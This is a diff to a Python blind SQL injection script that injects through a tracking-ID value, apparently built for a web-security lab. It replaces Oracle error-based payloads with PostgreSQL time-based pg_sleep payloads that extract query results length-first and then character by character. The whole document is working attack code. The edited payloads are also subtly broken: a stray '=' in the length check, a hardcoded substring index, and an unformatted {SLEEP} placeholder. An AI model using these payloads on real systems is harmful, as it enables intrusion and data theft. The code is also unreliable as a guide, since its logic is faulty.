@@ -7,6 +7,7 @@ import requests
 import utils
 from shop import Shop
 from sqli import SQLi
+
 log = logging.getLogger(__name__)
 logging.basicConfig(
     stream=sys.stdout,
@@ -17,7 +18,7 @@ logging.basicConfig(
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
+SLEEP = 10
 class MySQLi(SQLi):
     def __init__(self, tracking_id, session_token):
         super().__init__()
@@ -26,15 +27,15 @@ class MySQLi(SQLi):
         self.session_token = session_token
     def format_length_query(self, inner_query, length):
         return (
-            f"{self.tracking_id}'||(SELECT CASE WHEN ((select LENGTH(({inner_query})) from dual)"
-            f"={length}) THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
+            f"{self.tracking_id}'||(SELECT CASE WHEN ((select length(({inner_query})))={length}"
+            f"=) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
         
     def format_char_query(self, inner_query, index, char):
         return(
             f"{self.tracking_id}'||(SELECT CASE WHEN (("
-            f"select substr(({inner_query}),{index},1) from dual)=chr({char}))"
-            " THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
+            f"select SUBSTRING(({inner_query}),1,1))=chr({char}))"
+            " THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
     def is_true(self, resp):
         if resp.status_code == 200:
